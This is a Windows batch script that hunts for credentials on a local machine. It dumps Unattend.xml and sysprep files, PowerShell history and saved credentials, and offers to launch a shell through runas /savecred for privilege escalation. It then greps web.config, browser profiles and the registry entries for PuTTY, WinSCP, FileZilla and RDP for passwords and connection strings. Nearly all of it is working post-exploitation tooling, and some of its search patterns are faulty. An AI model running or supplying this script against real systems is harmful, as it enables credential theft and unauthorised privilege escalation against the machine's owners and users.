@echo off
echo Checking for Unattend.xml and related files...

:: Check C:\Unattend.xml
if exist "C:\Unattend.xml" (
    echo Contents of C:\Unattend.xml:
    type "C:\Unattend.xml"
    echo.
) else (
    echo C:\Unattend.xml does not exist.
    echo.
)

:: Check C:\Windows\Panther\Unattend.xml
if exist "C:\Windows\Panther\Unattend.xml" (
    echo Contents of C:\Windows\Panther\Unattend.xml:
    type "C:\Windows\Panther\Unattend.xml"
    echo.
) else (
    echo C:\Windows\Panther\Unattend.xml does not exist.
    echo.
)

:: Check C:\Windows\Panther\Unattend\Unattend.xml
if exist "C:\Windows\Panther\Unattend\Unattend.xml" (
    echo Contents of C:\Windows\Panther\Unattend\Unattend.xml:
    type "C:\Windows\Panther\Unattend\Unattend.xml"
    echo.
) else (
    echo C:\Windows\Panther\Unattend\Unattend.xml does not exist.
    echo.
)

:: Check C:\Windows\system32\sysprep.inf
if exist "C:\Windows\system32\sysprep.inf" (
    echo Contents of C:\Windows\system32\sysprep.inf:
    type "C:\Windows\system32\sysprep.inf"
    echo.
) else (
    echo C:\Windows\system32\sysprep.inf does not exist.
    echo.
)

:: Check C:\Windows\system32\sysprep\sysprep.xml
if exist "C:\Windows\system32\sysprep\sysprep.xml" (
    echo Contents of C:\Windows\system32\sysprep\sysprep.xml:
    type "C:\Windows\system32\sysprep\sysprep.xml"
    echo.
) else (
    echo C:\Windows\system32\sysprep\sysprep.xml does not exist.
    echo.
)

:: Check command history for possible passwords
echo Checking command history...
set "history_file=%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

if exist "%history_file%" (
    echo Contents of PowerShell command history:
    type "%history_file%"
    echo.
) else (
    echo PowerShell command history file does not exist.
    echo.
)

:: Check for saved credentials
echo Checking for saved credentials...
cmdkey /list

:: Prompt the user to use a saved credential
set /p use_credential="Do you want to use a saved credential? (yes/no): "
if /i "%use_credential%"=="yes" (
    set /p credential="Enter the username (e.g., admin): "
    if not "%credential%"=="" (
        echo Running cmd.exe with the credential: %credential%
        runas /savecred /user:%credential% cmd.exe
    ) else (
        echo No username provided. Skipping credential use.
    )
) else (
    echo Skipping credential use.
)

:: Prompt the user to check for database connection strings
set /p check_connections="Do you want to check for database connection strings? (yes/no): "
if /i "%check_connections%"=="yes" (
    echo Checking for database connection strings...

    :: Check Internet Explorer-related web.config files
    echo Checking Internet Explorer-related web.config files...
    if exist "C:\inetpub\wwwroot\web.config" (
        echo Contents of C:\inetpub\wwwroot\web.config:
        type "C:\inetpub\wwwroot\web.config" | findstr connectionString
        echo.
    ) else (
        echo C:\inetpub\wwwroot\web.config does not exist.
        echo.
    )

    if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" (
        echo Contents of C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config:
        type "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" | findstr connectionString
        echo.
    ) else (
        echo C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config does not exist.
        echo.
    )

    :: Check Chrome, Firefox, and Edge profiles for sensitive data
    echo Checking browser profiles for sensitive data...

    :: Chrome
    set "chrome_profile=%localappdata%\Google\Chrome\User Data\Default\Preferences"
    if exist "%chrome_profile%" (
        echo Checking Chrome profile for sensitive data:
        type "%chrome_profile%" | findstr /i "password\|username\|connectionString"
        echo.
    ) else (
        echo Chrome profile not found.
        echo.
    )

    :: Firefox
    set "firefox_profile=%appdata%\Mozilla\Firefox\Profiles"
    if exist "%firefox_profile%" (
        echo Checking Firefox profiles for sensitive data:
        for /d %%d in ("%firefox_profile%\*") do (
            echo Checking profile: %%d
            type "%%d\prefs.js" | findstr /i "password\|username\|connectionString"
            echo.
        )
    ) else (
        echo Firefox profiles not found.
        echo.
    )

    :: Edge
    set "edge_profile=%localappdata%\Microsoft\Edge\User Data\Default\Preferences"
    if exist "%edge_profile%" (
        echo Checking Edge profile for sensitive data:
        type "%edge_profile%" | findstr /i "password\|username\|connectionString"
        echo.
    ) else (
        echo Edge profile not found.
        echo.
    )
) else (
    echo Skipping database connection string check.
)

:: Prompt the user to check for application credentials
set /p check_app_creds="Do you want to check for application credentials? (yes/no): "
if /i "%check_app_creds%"=="yes" (
    echo Checking for application credentials...

    :: Check PuTTY saved sessions
    echo Checking PuTTY saved sessions...
    reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions" /s | findstr /i "Proxy\|HostName\|UserName\|Password"

    :: Check WinSCP saved sessions
    echo Checking WinSCP saved sessions...
    reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions" /s | findstr /i "HostName\|UserName\|Password"

    :: Check FileZilla saved sites
    echo Checking FileZilla saved sites...
    reg query "HKEY_CURRENT_USER\Software\FileZilla" /s | findstr /i "Host\|User\|Pass"

    :: Check RDP saved credentials
    echo Checking RDP saved credentials...
    reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s | findstr /i "UsernameHint"
) else (
    echo Skipping application credentials check.
)

echo Script completed.
pause
